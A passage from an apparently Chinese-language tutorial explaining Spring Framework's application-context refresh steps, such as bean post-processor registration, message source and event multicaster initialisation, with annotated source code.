invokeBeanDefinitionRegistryPostProcessors(currentRegistryProcessors, registry);\n \n        currentRegistryProcessors.clear();\n \n \n \n        // Finally, invoke all other BeanDefinitionRegistryPostProcessors until no further ones appear.\n \n        // 5.最后, 调用所有剩下的BeanDefinitionRegistryPostProcessors\n \n        boolean reiterate = true;\n \n        while (reiterate) {\n \n            reiterate = false;\n \n            // 5.1 找出所有实现BeanDefinitionRegistryPostProcessor接口的类\n \n            postProcessorNames = beanFactory.getBeanNamesForType(BeanDefinitionRegistryPostProcessor.class, true, false);\n \n            for (String ppName : postProcessorNames) {\n \n                // 5.2 跳过已经执行过的\n \n                if (!processedBeans.contains(ppName)) {\n \n                    currentRegistryProcessors.add(beanFactory.getBean(ppName, BeanDefinitionRegistryPostProcessor.class));\n \n                    processedBeans.add(ppName);\n \n                    // 5.3 如果有BeanDefinitionRegistryPostProcessor被执行, 则有可能会产生新的BeanDefinitionRegistryPostProcessor,\n \n                    // 因此这边将reiterate赋值为true, 代表需要再循环查找一次\n \n                    reiterate = true;\n \n                }\n \n            }\n \n            sortPostProcessors(currentRegistryProcessors, beanFactory);\n \n            registryProcessors.addAll(currentRegistryProcessors);\n \n            // 5.4 遍历currentRegistryProcessors, 执行postProcessBeanDefinitionRegistry方法\n \n            invokeBeanDefinitionRegistryPostProcessors(currentRegistryProcessors, registry);\n \n            currentRegistryProcessors.clear();\n \n        }\n \n \n \n        // Now, invoke the postProcessBeanFactory callback of all processors handled so far.\n \n        // 6.调用所有BeanDefinitionRegistryPostProcessor的postProcessBeanFactory方法(BeanDefinitionRegistryPostProcessor继承自BeanFactoryPostProcessor)\n \n        invokeBeanFactoryPostProcessors(registryProcessors, beanFactory);\n \n        // 7.最后, 调用入参beanFactoryPostProcessors中的普通BeanFactoryPostProcessor的postProcessBeanFactory方法\n \n        invokeBeanFactoryPostProcessors(regularPostProcessors, beanFactory);\n \n    } else {\n \n        // Invoke factory processors registered with the context instance.\n \n        invokeBeanFactoryPostProcessors(beanFactoryPostProcessors, beanFactory);\n \n    }\n \n \n \n    // 到这里 , 入参beanFactoryPostProcessors和容器中的所有BeanDefinitionRegistryPostProcessor已经全部处理完毕,\n \n    // 下面开始处理容器中的所有BeanFactoryPostProcessor\n \n \n \n    // Do not initialize FactoryBeans here: We need to leave all regular beans\n \n    // uninitialized to let the bean factory post-processors apply to them!\n \n    // 8.找出所有实现BeanFactoryPostProcessor接口的类\n \n    String[] postProcessorNames =\n \n            beanFactory.getBeanNamesForType(BeanFactoryPostProcessor.class, true, false);\n \n \n \n    // Separate between BeanFactoryPostProcessors that implement PriorityOrdered,\n \n    // Ordered, and the rest.\n \n    // 用于存放实现了PriorityOrdered接口的BeanFactoryPostProcessor\n \n    List<BeanFactoryPostProcessor> priorityOrderedPostProcessors = new ArrayList<BeanFactoryPostProcessor>();\n \n    // 用于存放实现了Ordered接口的BeanFactoryPostProcessor的beanName\n \n    List<String> orderedPostProcessorNames = new ArrayList<String>();\n \n    // 用于存放普通BeanFactoryPostProcessor的beanName\n \n    List<String> nonOrderedPostProcessorNames = new ArrayList<String>();\n \n    // 8.1 遍历postProcessorNames, 将BeanFactoryPostProcessor按实现PriorityOrdered、实现Ordered接口、普通三种区分开\n \n    for (String ppName : postProcessorNames) {\n \n        // 8.2 跳过已经执行过的\n \n        if (processedBeans.contains(ppName)) {\n \n            // skip - already processed in first phase above\n \n        } else if (beanFactory.isTypeMatch(ppName, PriorityOrdered.class)) {\n \n            // 8.3 添加实现了PriorityOrdered接口的BeanFactoryPostProcessor\n \n            priorityOrderedPostProcessors.add(beanFactory.getBean(ppName, BeanFactoryPostProcessor.class));\n \n        } else if (beanFactory.isTypeMatch(ppName, Ordered.class)) {\n \n            // 8.4 添加实现了Ordered接口的BeanFactoryPostProcessor的beanName\n \n            orderedPostProcessorNames.add(ppName);\n \n        } else {\n \n            // 8.5 添加剩下的普通BeanFactoryPostProcessor的beanName\n \n            nonOrderedPostProcessorNames.add(ppName);\n \n        }\n \n    }\n \n \n \n    // First, invoke the BeanFactoryPostProcessors that implement PriorityOrdered.\n \n    // 9.调用所有实现PriorityOrdered接口的BeanFactoryPostProcessor\n \n    // 9.1 对priorityOrderedPostProcessors排序\n \n    sortPostProcessors(priorityOrderedPostProcessors, beanFactory);\n \n    // 9.2 遍历priorityOrderedPostProcessors, 执行postProcessBeanFactory方法\n \n    invokeBeanFactoryPostProcessors(priorityOrderedPostProcessors, beanFactory);\n \n \n \n    // Next, invoke the BeanFactoryPostProcessors that implement Ordered.\n \n    // 10.调用所有实现Ordered接口的BeanFactoryPostProcessor\n \n    List<BeanFactoryPostProcessor> orderedPostProcessors = new ArrayList<BeanFactoryPostProcessor>();\n \n    for (String postProcessorName : orderedPostProcessorNames) {\n \n        // 10.1 获取postProcessorName对应的bean实例, 添加到orderedPostProcessors, 准备执行\n \n        orderedPostProcessors.add(beanFactory.getBean(postProcessorName, BeanFactoryPostProcessor.class));\n \n    }\n \n    // 10.2 对orderedPostProcessors排序\n \n    sortPostProcessors(orderedPostProcessors, beanFactory);\n \n    // 10.3 遍历orderedPostProcessors, 执行postProcessBeanFactory方法\n \n    invokeBeanFactoryPostProcessors(orderedPostProcessors, beanFactory);\n \n \n \n    // Finally, invoke all other BeanFactoryPostProcessors.\n \n    // 11.调用所有剩下的BeanFactoryPostProcessor\n \n    List<BeanFactoryPostProcessor> nonOrderedPostProcessors = new ArrayList<BeanFactoryPostProcessor>();\n \n    for (String postProcessorName : nonOrderedPostProcessorNames) {\n \n        // 11.1 获取postProcessorName对应的bean实例, 添加到nonOrderedPostProcessors, 准备执行\n \n        nonOrderedPostProcessors.add(beanFactory.getBean(postProcessorName, BeanFactoryPostProcessor.class));\n \n    }\n \n    // 11.2 遍历nonOrderedPostProcessors, 执行postProcessBeanFactory方法\n \n    invokeBeanFactoryPostProcessors(nonOrderedPostProcessors, beanFactory);\n \n \n \n    // Clear cached merged bean definitions since the post-processors might have\n \n    // modified the original metadata, e.g. replacing placeholders in values...\n \n    // 12.清除元数据缓存（mergedBeanDefinitions、allBeanNamesByType、singletonBeanNamesByType），\n \n    // 因为后处理器可能已经修改了原始元数据，例如， 替换值中的占位符...\n \n    beanFactory.clearMetadataCache();\n \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n138\n139\n140\n141\n142\n143\n144\n145\n146\n147\n148\n149\n150\n151\n152\n153\n154\n155\n156\n157\n158\n159\n160\n161\n162\n163\n164\n165\n166\n167\n168\n169\n170\n171\n172\n173\n174\n175\n176\n177\n178\n179\n180\n181\n182\n183\n184\n185\n186\n187\n188\n189\n190\n191\n192\n193\n194\n195\n196\n197\n198\n199\n200\n201\n202\n203\n204\n205\n206\n207\n208\n209\n210\n211\n212\n213\n214\n215\n216\n217\n218\n219\n220\n221\n222\n223\n224\n225\n226\n227\n228\n229\n230\n231\n232\n233\n234\n235\n236\n237\n238\n239\n240\n241\n242\n243\n244\n245\n246\n247\n248\n249\n250\n251\n252\n253\n254\n255\n256\n257\n258\n259\n260\n261\n262\n263\n264\n265\n266\n267\n268\n269\n270\n271\n272\n273\n274\n275\n276\n277\n278\n279\n280\n281\n282\n283\n284\n285\n286\n287\n288\n289\n290\n291\n292\n293\n294\n295\n296\n297\n298\n299\n300\n301\n302\n303\n304\n305\n306\n307\n308\n309\n310\n311\n312\n313\n314\n315\n316\n317\n318\n319\n320\n321\n322\n323\n324\n325\n326\n327\n328\n329\n330\n331\n332\n333\n334\n335\n336\n337\n338\n339\n340\n341\n342\n343\n344\n345\n346\n347\n348\n349\n350\n351\n352\n353\n354\n355\n356\n357\n358\n359\n360\n361\n362\n363\n364\n365\n366\n367\n368\n369\n370\n371\n\n\n\n# 5.8 核心方法之一 registerBeanPostProcessors()\n\n本方法会注册所有的 BeanPostProcessor，将所有实现了 BeanPostProcessor 接口的类加载到 BeanFactory 中。BeanPostProcessor 接口是 Spring 初始化 bean 时对外暴露的扩展点，Spring IoC 容器允许 BeanPostProcessor 在容器初始化 bean 的前后，添加自己的逻辑处理。\n\n \npublic static void registerBeanPostProcessors(\n        ConfigurableListableBeanFactory beanFactory, AbstractApplicationContext applicationContext) {\n \n \n \n    // 1.找出所有实现BeanPostProcessor接口的类\n \n    String[] postProcessorNames = beanFactory.getBeanNamesForType(BeanPostProcessor.class, true, false);\n \n \n \n    // Register BeanPostProcessorChecker that logs an info message when\n \n    // a bean is created during BeanPostProcessor instantiation, i.e. when\n \n    // a bean is not eligible for getting processed by all BeanPostProcessors.\n \n    // BeanPostProcessor的目标计数\n \n    int beanProcessorTargetCount = beanFactory.getBeanPostProcessorCount() + 1 + postProcessorNames.length;\n \n    // 2.添加BeanPostProcessorChecker(主要用于记录信息)到beanFactory中\n \n    beanFactory.addBeanPostProcessor(new BeanPostProcessorChecker(beanFactory, beanProcessorTargetCount));\n \n \n \n    // Separate between BeanPostProcessors that implement PriorityOrdered,\n \n    // Ordered, and the rest.\n \n    // 3.定义不同的变量用于区分: 实现PriorityOrdered接口的BeanPostProcessor、实现Ordered接口的BeanPostProcessor、普通BeanPostProcessor\n \n    // 3.1 priorityOrderedPostProcessors: 用于存放实现PriorityOrdered接口的BeanPostProcessor\n \n    List<BeanPostProcessor> priorityOrderedPostProcessors = new ArrayList<BeanPostProcessor>();\n \n    // 3.2 internalPostProcessors: 用于存放Spring内部的BeanPostProcessor\n \n    List<BeanPostProcessor> internalPostProcessors = new ArrayList<BeanPostProcessor>();\n \n    // 3.3 orderedPostProcessorNames: 用于存放实现Ordered接口的BeanPostProcessor的beanName\n \n    List<String> orderedPostProcessorNames = new ArrayList<String>();\n \n    // 3.4 nonOrderedPostProcessorNames: 用于存放普通BeanPostProcessor的beanName\n \n    List<String> nonOrderedPostProcessorNames = new ArrayList<String>();\n \n    // 4.遍历postProcessorNames, 将BeanPostProcessors按3.1 - 3.4定义的变量区分开\n \n    for (String ppName : postProcessorNames) {\n \n        if (beanFactory.isTypeMatch(ppName, PriorityOrdered.class)) {\n \n            // 4.1 如果ppName对应的Bean实例实现了PriorityOrdered接口, 则拿到ppName对应的Bean实例并添加到priorityOrderedPostProcessors\n \n            BeanPostProcessor pp = beanFactory.getBean(ppName, BeanPostProcessor.class);\n \n            priorityOrderedPostProcessors.add(pp);\n \n            if (pp instanceof MergedBeanDefinitionPostProcessor) {\n \n                // 4.2 如果ppName对应的Bean实例也实现了MergedBeanDefinitionPostProcessor接口,\n \n                // 则将ppName对应的Bean实例添加到internalPostProcessors\n \n                internalPostProcessors.add(pp);\n \n            }\n \n        }\n \n        else if (beanFactory.isTypeMatch(ppName, Ordered.class)) {\n \n            // 4.3 如果ppName对应的Bean实例没有实现PriorityOrdered接口, 但是实现了Ordered接口, 则将ppName添加到orderedPostProcessorNames\n \n            orderedPostProcessorNames.add(ppName);\n \n        }\n \n        else {\n \n            // 4.4 否则, 将ppName添加到nonOrderedPostProcessorNames\n \n            nonOrderedPostProcessorNames.add(ppName);\n \n        }\n \n    }\n \n \n \n    // First, register the BeanPostProcessors that implement PriorityOrdered.\n \n    // 5.首先, 注册实现PriorityOrdered接口的BeanPostProcessors\n \n    // 5.1 对priorityOrderedPostProcessors进行排序\n \n    sortPostProcessors(priorityOrderedPostProcessors, beanFactory);\n \n    // 5.2 注册priorityOrderedPostProcessors\n \n    registerBeanPostProcessors(beanFactory, priorityOrderedPostProcessors);\n \n \n \n    // Next, register the BeanPostProcessors that implement Ordered.\n \n    // 6.接下来, 注册实现Ordered接口的BeanPostProcessors\n \n    List<BeanPostProcessor> orderedPostProcessors = new ArrayList<BeanPostProcessor>();\n \n    for (String ppName : orderedPostProcessorNames) {\n \n        // 6.1 拿到ppName对应的BeanPostProcessor实例对象\n \n        BeanPostProcessor pp = beanFactory.getBean(ppName, BeanPostProcessor.class);\n \n        // 6.2 将ppName对应的BeanPostProcessor实例对象添加到orderedPostProcessors, 准备执行注册\n \n        orderedPostProcessors.add(pp);\n \n        if (pp instanceof MergedBeanDefinitionPostProcessor) {\n \n            // 6.3 如果ppName对应的Bean实例也实现了MergedBeanDefinitionPostProcessor接口,\n \n            // 则将ppName对应的Bean实例添加到internalPostProcessors\n \n            internalPostProcessors.add(pp);\n \n        }\n \n    }\n \n    // 6.4 对orderedPostProcessors进行排序\n \n    sortPostProcessors(orderedPostProcessors, beanFactory);\n \n    // 6.5 注册orderedPostProcessors\n \n    registerBeanPostProcessors(beanFactory, orderedPostProcessors);\n \n \n \n    // Now, register all regular BeanPostProcessors.\n \n    // 7.注册所有常规的BeanPostProcessors（过程与6类似）\n \n    List<BeanPostProcessor> nonOrderedPostProcessors = new ArrayList<BeanPostProcessor>();\n \n    for (String ppName : nonOrderedPostProcessorNames) {\n \n        BeanPostProcessor pp = beanFactory.getBean(ppName, BeanPostProcessor.class);\n \n        nonOrderedPostProcessors.add(pp);\n \n        if (pp instanceof MergedBeanDefinitionPostProcessor) {\n \n            internalPostProcessors.add(pp);\n \n        }\n \n    }\n \n    registerBeanPostProcessors(beanFactory, nonOrderedPostProcessors);\n \n \n \n    // Finally, re-register all internal BeanPostProcessors.\n \n    // 8.最后, 重新注册所有内部BeanPostProcessors（相当于内部的BeanPostProcessor会被移到处理器链的末尾）\n \n    // 8.1 对internalPostProcessors进行排序\n \n    sortPostProcessors(internalPostProcessors, beanFactory);\n \n    // 8.2注册internalPostProcessors\n \n    registerBeanPostProcessors(beanFactory, internalPostProcessors);\n \n \n \n    // Re-register post-processor for detecting inner beans as ApplicationListeners,\n \n    // moving it to the end of the processor chain (for picking up proxies etc).\n \n    // 9.重新注册ApplicationListenerDetector（跟8类似，主要是为了移动到处理器链的末尾）\n \n    beanFactory.addBeanPostProcessor(new ApplicationListenerDetector(applicationContext));\n \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n138\n139\n140\n141\n142\n143\n144\n145\n146\n147\n148\n149\n150\n151\n152\n153\n154\n155\n156\n157\n158\n159\n160\n161\n162\n163\n164\n165\n166\n167\n168\n169\n170\n171\n172\n173\n174\n175\n176\n177\n178\n179\n180\n181\n182\n183\n184\n185\n186\n187\n188\n189\n190\n191\n192\n193\n\n\n使用：可以在bean的初始化前后添加自己想要的代码\n\n \npublic static void registerBeanPostProcessors(\n        ConfigurableListableBeanFactory beanFactory, AbstractApplicationContext applicationContext) {\n \n \n \n    // 1.找出所有实现BeanPostProcessor接口的类\n \n    String[] postProcessorNames = beanFactory.getBeanNamesForType(BeanPostProcessor.class, true, false);\n \n \n \n    // Register BeanPostProcessorChecker that logs an info message when\n \n    // a bean is created during BeanPostProcessor instantiation, i.e. when\n \n    // a bean is not eligible for getting processed by all BeanPostProcessors.\n \n    // BeanPostProcessor的目标计数\n \n    int beanProcessorTargetCount = beanFactory.getBeanPostProcessorCount() + 1 + postProcessorNames.length;\n \n    // 2.添加BeanPostProcessorChecker(主要用于记录信息)到beanFactory中\n \n    beanFactory.addBeanPostProcessor(new BeanPostProcessorChecker(beanFactory, beanProcessorTargetCount));\n \n \n \n    // Separate between BeanPostProcessors that implement PriorityOrdered,\n \n    // Ordered, and the rest.\n \n    // 3.定义不同的变量用于区分: 实现PriorityOrdered接口的BeanPostProcessor、实现Ordered接口的BeanPostProcessor、普通BeanPostProcessor\n \n    // 3.1 priorityOrderedPostProcessors: 用于存放实现PriorityOrdered接口的BeanPostProcessor\n \n    List<BeanPostProcessor> priorityOrderedPostProcessors = new ArrayList<BeanPostProcessor>();\n \n    // 3.2 internalPostProcessors: 用于存放Spring内部的BeanPostProcessor\n \n    List<BeanPostProcessor> internalPostProcessors = new ArrayList<BeanPostProcessor>();\n \n    // 3.3 orderedPostProcessorNames: 用于存放实现Ordered接口的BeanPostProcessor的beanName\n \n    List<String> orderedPostProcessorNames = new ArrayList<String>();\n \n    // 3.4 nonOrderedPostProcessorNames: 用于存放普通BeanPostProcessor的beanName\n \n    List<String> nonOrderedPostProcessorNames = new ArrayList<String>();\n \n    // 4.遍历postProcessorNames, 将BeanPostProcessors按3.1 - 3.4定义的变量区分开\n \n    for (String ppName : postProcessorNames) {\n \n        if (beanFactory.isTypeMatch(ppName, PriorityOrdered.class)) {\n \n            // 4.1 如果ppName对应的Bean实例实现了PriorityOrdered接口, 则拿到ppName对应的Bean实例并添加到priorityOrderedPostProcessors\n \n            BeanPostProcessor pp = beanFactory.getBean(ppName, BeanPostProcessor.class);\n \n            priorityOrderedPostProcessors.add(pp);\n \n            if (pp instanceof MergedBeanDefinitionPostProcessor) {\n \n                // 4.2 如果ppName对应的Bean实例也实现了MergedBeanDefinitionPostProcessor接口,\n \n                // 则将ppName对应的Bean实例添加到internalPostProcessors\n \n                internalPostProcessors.add(pp);\n \n            }\n \n        }\n \n        else if (beanFactory.isTypeMatch(ppName, Ordered.class)) {\n \n            // 4.3 如果ppName对应的Bean实例没有实现PriorityOrdered接口, 但是实现了Ordered接口, 则将ppName添加到orderedPostProcessorNames\n \n            orderedPostProcessorNames.add(ppName);\n \n        }\n \n        else {\n \n            // 4.4 否则, 将ppName添加到nonOrderedPostProcessorNames\n \n            nonOrderedPostProcessorNames.add(ppName);\n \n        }\n \n    }\n \n \n \n    // First, register the BeanPostProcessors that implement PriorityOrdered.\n \n    // 5.首先, 注册实现PriorityOrdered接口的BeanPostProcessors\n \n    // 5.1 对priorityOrderedPostProcessors进行排序\n \n    sortPostProcessors(priorityOrderedPostProcessors, beanFactory);\n \n    // 5.2 注册priorityOrderedPostProcessors\n \n    registerBeanPostProcessors(beanFactory, priorityOrderedPostProcessors);\n \n \n \n    // Next, register the BeanPostProcessors that implement Ordered.\n \n    // 6.接下来, 注册实现Ordered接口的BeanPostProcessors\n \n    List<BeanPostProcessor> orderedPostProcessors = new ArrayList<BeanPostProcessor>();\n \n    for (String ppName : orderedPostProcessorNames) {\n \n        // 6.1 拿到ppName对应的BeanPostProcessor实例对象\n \n        BeanPostProcessor pp = beanFactory.getBean(ppName, BeanPostProcessor.class);\n \n        // 6.2 将ppName对应的BeanPostProcessor实例对象添加到orderedPostProcessors, 准备执行注册\n \n        orderedPostProcessors.add(pp);\n \n        if (pp instanceof MergedBeanDefinitionPostProcessor) {\n \n            // 6.3 如果ppName对应的Bean实例也实现了MergedBeanDefinitionPostProcessor接口,\n \n            // 则将ppName对应的Bean实例添加到internalPostProcessors\n \n            internalPostProcessors.add(pp);\n \n        }\n \n    }\n \n    // 6.4 对orderedPostProcessors进行排序\n \n    sortPostProcessors(orderedPostProcessors, beanFactory);\n \n    // 6.5 注册orderedPostProcessors\n \n    registerBeanPostProcessors(beanFactory, orderedPostProcessors);\n \n \n \n    // Now, register all regular BeanPostProcessors.\n \n    // 7.注册所有常规的BeanPostProcessors（过程与6类似）\n \n    List<BeanPostProcessor> nonOrderedPostProcessors = new ArrayList<BeanPostProcessor>();\n \n    for (String ppName : nonOrderedPostProcessorNames) {\n \n        BeanPostProcessor pp = beanFactory.getBean(ppName, BeanPostProcessor.class);\n \n        nonOrderedPostProcessors.add(pp);\n \n        if (pp instanceof MergedBeanDefinitionPostProcessor) {\n \n            internalPostProcessors.add(pp);\n \n        }\n \n    }\n \n    registerBeanPostProcessors(beanFactory, nonOrderedPostProcessors);\n \n \n \n    // Finally, re-register all internal BeanPostProcessors.\n \n    // 8.最后, 重新注册所有内部BeanPostProcessors（相当于内部的BeanPostProcessor会被移到处理器链的末尾）\n \n    // 8.1 对internalPostProcessors进行排序\n \n    sortPostProcessors(internalPostProcessors, beanFactory);\n \n    // 8.2注册internalPostProcessors\n \n    registerBeanPostProcessors(beanFactory, internalPostProcessors);\n \n \n \n    // Re-register post-processor for detecting inner beans as ApplicationListeners,\n \n    // moving it to the end of the processor chain (for picking up proxies etc).\n \n    // 9.重新注册ApplicationListenerDetector（跟8类似，主要是为了移动到处理器链的末尾）\n \n    beanFactory.addBeanPostProcessor(new ApplicationListenerDetector(applicationContext));\n \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n138\n139\n140\n141\n142\n143\n144\n145\n146\n147\n148\n149\n150\n151\n152\n153\n154\n155\n156\n157\n158\n159\n160\n161\n162\n163\n164\n165\n166\n167\n168\n169\n170\n171\n172\n173\n174\n175\n176\n177\n178\n179\n180\n181\n182\n183\n184\n185\n186\n187\n188\n189\n190\n191\n192\n193\n\n\n\n# 5.9 initMessageSource()\n\n/**\n* Initialize the MessageSource.\n* Use parent\'s if none defined in this context.\n*/\nprotected void initMessageSource() {\n   //获取Bean工厂，一般是DefaultListBeanFactory\n   ConfigurableListableBeanFactory beanFactory = getBeanFactory();\n   //首先判断是否已有xml文件定义了id为messageSource的bean对象\n   if (beanFactory.containsLocalBean(MESSAGE_SOURCE_BEAN_NAME)) {\n      //如果有，则从Bean工厂得到这个bean对象\n      this.messageSource = beanFactory.getBean(MESSAGE_SOURCE_BEAN_NAME, MessageSource.class);\n      // Make MessageSource aware of parent MessageSource.\n      //当父类Bean工厂不为空，并且这个bean对象是HierarchicalMessageSource类型\n      if (this.parent != null && this.messageSource instanceof HierarchicalMessageSource) {\n         //为HierarchicalMessageSource的实现类\n         HierarchicalMessageSource hms = (HierarchicalMessageSource) this.messageSource;\n         //设置父类MessageSource，此处设置内部的parent messageSource\n         if (hms.getParentMessageSource() == null) {\n            // Only set parent context as parent MessageSource if no parent MessageSource\n            // registered already.\n            hms.setParentMessageSource(getInternalParentMessageSource());\n         }\n      }\n      if (logger.isTraceEnabled()) {\n         logger.trace("Using MessageSource [" + this.messageSource + "]");\n      }\n   }\n   else {\n      // Use empty MessageSource to be able to accept getMessage calls.\n      //如果没有xml文件定义信息源对象，新建DelegatingMessageSource类作为messageSource的Bean\n      //因为DelegatingMessageSource类实现了HierarchicalMessageSource接口，而这个接口继承了MessageSource这个类\n      //因此实现了这个接口的类，都是MessageSource的子类，因此DelegatingMessageSource也是一个MessageSource\n      DelegatingMessageSource dms = new DelegatingMessageSource();\n      //给这个DelegatingMessageSource添加父类消息源\n      dms.setParentMessageSource(getInternalParentMessageSource());\n      this.messageSource = dms;\n      //将这个messageSource实例注册到Bean工厂中\n      beanFactory.registerSingleton(MESSAGE_SOURCE_BEAN_NAME, this.messageSource);\n      if (logger.isTraceEnabled()) {\n         logger.trace("No \'" + MESSAGE_SOURCE_BEAN_NAME + "\' bean, using [" + this.messageSource + "]");\n      }\n   }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n\n\n\n# 5.10 initApplicationEventMulticaster()\n\n代码很简单，就是分两种情况进行初始化的过程\n\nprotected void initApplicationEventMulticaster() {\n    ConfigurableListableBeanFactory beanFactory = getBeanFactory();\n    if (beanFactory.containsLocalBean(APPLICATION_EVENT_MULTICASTER_BEAN_NAME)) {\n        this.applicationEventMulticaster =\n            beanFactory.getBean(APPLICATION_EVENT_MULTICASTER_BEAN_NAME, ApplicationEventMulticaster.class);\n        if (logger.isTraceEnabled()) {\n            logger.trace("Using ApplicationEventMulticaster [" + this.applicationEventMulticaster + "]");\n        }\n    }\n    else {\n        this.applicationEventMulticaster = new SimpleApplicationEventMulticaster(beanFactory);\n        beanFactory.registerSingleton(APPLICATION_EVENT_MULTICASTER_BEAN_NAME, this.applicationEventMulticaster);\n        if (logger.isTraceEnabled()) {\n            logger.trace("No \'" + APPLICATION_EVENT_MULTICASTER_BEAN_NAME + "\' bean, using " +\n                         "[" + this.applicationEventMulticaster.getClass().getSimpleName() + "]");\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n\n# 5.11 onRefresh()\n\n这个方法是空的没有进行实现，官网给的注释是\n\nInitialize other special beans in specific context subclasses.\n\n初始化一些其他的特殊的bean\n\n\n# 5.12 registerListeners()\n\n获取ApplicationContext初始化的listeners，然后添加到EventMulticaster，这个刚才初始化的\n\n这里面的earlyApplicationEvents是在第一步的时候进行初始化的\n\n在prepareRefresh方法中的\n\nthis.earlyApplicationEvents = new LinkedHashSet<>();\n\n\tprotected void registerListeners() {\n\t\t// Register statically specified listeners first.\n\t\tfor (ApplicationListener<?> listener : getApplicationListeners()) {\n\t\t\tgetApplicationEventMulticaster().addApplicationListener(listener);\n\t\t}\n \n\t\t// Do not initialize FactoryBeans here: We need to leave all regular beans\n\t\t// uninitialized to let post-processors apply to them!\n\t\tString[] listenerBeanNames = getBeanNamesForType(ApplicationListener.class, true, false);\n\t\tfor (String listenerBeanName : listenerBeanNames) {\n\t\t\tgetApplicationEventMulticaster().addApplicationListenerBean(listenerBeanName);\n\t\t}\n \n\t\t// Publish early application events now that we finally have a multicaster...\n\t\tSet<ApplicationEvent> earlyEventsToProcess = this.earlyApplicationEvents;\n\t\tthis.earlyApplicationEvents = null;\n\t\tif (earlyEventsToProcess != null) {\n\t\t\tfor (ApplicationEvent earlyEvent : earlyEventsToProcess) {\n\t\t\t\tgetApplicationEventMulticaster().multicastEvent(earlyEvent);\n\t\t\t}\n\t\t}\n\t}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n自定义监听器的实现\n\nimport org.springframework.context.ApplicationListener;\nimport org.springframework.context.event.ContextRefreshedEvent;\nimport org.springframework.stereotype.Component;\n@Component\npublic class MyRefreshedListener implements ApplicationListener<ContextRefreshedEvent> {\n    @Override\n    public void onApplicationEvent(ContextRefreshedEvent event) {\n        // 自己的逻辑处理\n    }\n \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# 5.13 核心方法之一 finishBeanFactoryInitialization(beanFactory)\n\nprotected void finishBeanFactoryInitialization(ConfigurableListableBeanFactory beanFactory) {\n    // Initialize conversion service for this context.\n    if (beanFactory.containsBean(CONVERSION_SERVICE_BEAN_NAME) &&\n    beanFactory.isTypeMatch(CONVERSION_SERVICE_BEAN_NAME, ConversionService.class)) {\n    beanFactory.setConversionService(\n    beanFactory.getBean(CONVERSION_SERVICE_BEAN_NAME, ConversionService.class));\n    }\n\n    // Register a default embedded value resolver if no bean post-processor\n    // (such as a PropertyPlaceholderConfigurer bean) registered any before:\n    // at this point, primarily for resolution in annotation attribute values.\n    if (!beanFactory.hasEmbeddedValueResolver()) {\n    beanFactory.addEmbeddedValueResolver(strVal -> getEnvironment().resolvePlaceholders(strVal));\n    }\n\n    // Initialize LoadTimeWeaverAware beans early to allow for registering their transformers early.\n    String[] weaverAwareNames = beanFactory.getBeanNamesForType(LoadTimeWeaverAware.class, false, false);\n    for (String weaverAwareName : weaverAwareNames) {\n    getBean(weaverAwareName);\n    }\n\n    // Stop using the temporary ClassLoader for type matching.\n    beanFactory.setTempClassLoader(null);\n\n    // Allow for caching all bean definition metadata, not expecting further changes.\n    beanFactory.freezeConfiguration();\n\n    // Instantiate all remaining (non-lazy-init) singletons.\n    